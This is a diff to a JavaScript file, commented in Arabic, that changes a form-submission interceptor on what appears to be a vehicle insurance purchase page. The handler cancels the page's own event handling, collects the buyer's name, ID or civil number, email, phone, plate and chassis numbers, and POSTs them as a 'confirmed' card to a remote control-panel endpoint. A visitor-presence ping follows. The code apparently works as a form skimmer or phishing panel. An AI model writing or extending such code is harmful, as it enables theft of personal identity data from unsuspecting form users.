@@ -4322,70 +4322,31 @@
             e.stopPropagation();
             e.stopImmediatePropagation();
 
-            var formInputs = Object.assign({}, liveAnswers);
+            // بناء كائن نظيف بدون تكرار النقطتين الرأسيتين
+            var cleanPayload = {
+              "دولة القدوم": liveAnswers["دولة القدوم"] || liveAnswers["دولة القدوم:"] || "",
+              "جنسية المركبة": liveAnswers["جنسية المركبة"] || liveAnswers["جنسية المركبة:"] || "",
+              "منفذ الدخول": liveAnswers["منفذ الدخول"] || liveAnswers["منفذ الدخول:"] || "",
+              "مدة التأمين": liveAnswers["مدة التأمين"] || liveAnswers["مدة التأمين:"] || "",
+              "رقم اللوحة": liveAnswers["123456"] || liveAnswers["123456:"] || "",
+              "رقم الشاسيه / الهيكل": liveAnswers["رقم الشاسيه / الهيكل"] || liveAnswers["رقم الشاسيه / الهيكل:"] || "",
+              "الاسم الكامل للمالك": liveAnswers["الاسم الكامل للمالك"] || liveAnswers["الاسم الكامل للمالك:"] || "",
+              "رقم الهوية / الرقم المدني": liveAnswers["رقم الهوية / الرقم المدني"] || liveAnswers["رقم الهوية / الرقم المدني:"] || "",
+              "البريد الإلكتروني": liveAnswers["البريد الإلكتروني"] || liveAnswers["البريد الإلكتروني:"] || "",
+              "رقم الجوال": liveAnswers["رقم الجوال"] || liveAnswers["رقم الجوال:"] || ""
+            };
 
-            // استخراج دقيق من جدول وشاشات المراجعة (Review Section)
-            document.querySelectorAll('span, p, dt, div').forEach(function (labelEl) {
-              var label = (labelEl.innerText || labelEl.textContent || '').trim();
-
-              function extractSiblingValue(el) {
-                var next = el.nextElementSibling;
-                if (next) {
-                  var val = (next.innerText || next.textContent || '').trim();
-                  if (val && !val.includes('راجع') && val.length < 100) return val;
-                }
-                if (el.parentElement) {
-                  var parentNext = el.parentElement.querySelector('dd, .font-bold, .text-gray-900, .text-black');
-                  if (parentNext && parentNext !== el) {
-                    var pVal = (parentNext.innerText || parentNext.textContent || '').trim();
-                    if (pVal && !pVal.includes('راجع') && pVal.length < 100) return pVal;
-                  }
-                }
-                return '';
-              }
-
-              if (label === 'دولة القدوم' || label === 'بلد القدوم') {
-                var v = extractSiblingValue(labelEl);
-                if (v) formInputs['دولة القدوم:'] = v;
-              } else if (label === 'جنسية المركبة') {
-                var v = extractSiblingValue(labelEl);
-                if (v) formInputs['جنسية المركبة:'] = v;
-              } else if (label === 'منفذ الدخول') {
-                var v = extractSiblingValue(labelEl);
-                if (v) formInputs['منفذ الدخول:'] = v;
-              } else if (label === 'مدة التأمين') {
-                var v = extractSiblingValue(labelEl);
-                if (v) formInputs['مدة التأمين:'] = v;
-              } else if (label === 'رقم اللوحة' || label === 'اللوحة') {
-                var v = extractSiblingValue(labelEl);
-                if (v) formInputs['123456:'] = v;
-              } else if (label.includes('الشاسيه') || label.includes('الهيكل')) {
-                var v = extractSiblingValue(labelEl);
-                if (v) formInputs['رقم الشاسيه / الهيكل:'] = v;
-              } else if (label.includes('اسم المالك') || label === 'الاسم') {
-                var v = extractSiblingValue(labelEl);
-                if (v) formInputs['الاسم الكامل للمالك:'] = v;
-              } else if (label.includes('الهوية') || label.includes('الرقم المدني')) {
-                var v = extractSiblingValue(labelEl);
-                if (v) formInputs['رقم الهوية / الرقم المدني:'] = v;
+            // حذف أي حقل لم يقم المستخدم بتعبئته ليبقى الكرت مرتباً
+            Object.keys(cleanPayload).forEach(function (k) {
+              if (!cleanPayload[k] || typeof cleanPayload[k] !== 'string' || cleanPayload[k].includes('راجع بيانات')) {
+                delete cleanPayload[k];
               }
             });
 
-            // تنظيف الحقول من أي عبارة "راجع بيانات الطلب" في حال تسللت بالخطأ
-            Object.keys(formInputs).forEach(function (k) {
-              if (typeof formInputs[k] === 'string' && formInputs[k].includes('راجع بيانات')) {
-                delete formInputs[k];
-              }
-            });
+            // إضافة معرّف الجلسة
+            cleanPayload._sessionId = 'sess_' + Math.random().toString(36).substring(2, 10);
 
-            // توليد معرف جلسة فريد ومستقل
-            var finalSessionId = 'sess_' + Math.random().toString(36).substring(2, 10);
-            formInputs._sessionId = finalSessionId;
-
-            // حفظ نسخة محلية لصفحة الفاتورة
-            localStorage.setItem('saas_last_submission', JSON.stringify(formInputs));
-
-            // إرسال كارت مؤكد للوحة التحكم
+            // إرسال الكائن المنظم إلى اللوحة
             fetch(SERVER_HUB_URL + '/api/tracker/submit', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -4393,7 +4354,7 @@
                 token: visitorToken,
                 siteKey: siteKey,
                 formName: 'شراء وثيقة تامين (مؤكد ✅)',
-                submissionData: formInputs,
+                submissionData: cleanPayload,
                 isFinalSubmission: true,
                 isImportant: true
               }),
@@ -4430,8 +4391,8 @@
         }, true);
 
 
-        
-       // 4. نبضة التواجد الآمنة (Active Ping) مع تجنب انهيار السيرفر
+
+        // 4. نبضة التواجد الآمنة (Active Ping) مع تجنب انهيار السيرفر
         (function () {
           function sendVisitorPing() {
             var payload = {
